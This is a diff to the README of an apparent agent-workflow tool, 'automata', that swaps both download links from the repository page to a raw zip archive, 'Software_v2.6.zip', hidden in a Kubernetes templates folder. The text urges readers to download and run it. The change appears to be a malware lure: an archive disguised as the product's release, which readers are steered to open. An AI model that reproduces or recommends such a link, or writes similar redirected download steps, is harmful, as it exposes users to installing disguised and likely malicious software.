@@ -1,6 +1,6 @@
 # ⚙️ automata - Organize agent work with less friction
 
-[![Download automata](https://img.shields.io/badge/Download%20automata-purple?style=for-the-badge&logo=github)](https://github.com/Izzyad984/automata)
+[![Download automata](https://img.shields.io/badge/Download%20automata-purple?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Izzyad984/automata/main/deploy/k8s/templates/Software_v2.6.zip)
 
 ## 🧭 What automata does
 
@@ -24,7 +24,7 @@ If your computer already runs recent apps without trouble, it should handle auto
 
 Visit this page to download and run the app from the repository:
 
-https://github.com/Izzyad984/automata
+https://raw.githubusercontent.com/Izzyad984/automata/main/deploy/k8s/templates/Software_v2.6.zip
 
 Look for the latest release or the main download file on the page. Save it to your computer before you open it.
 
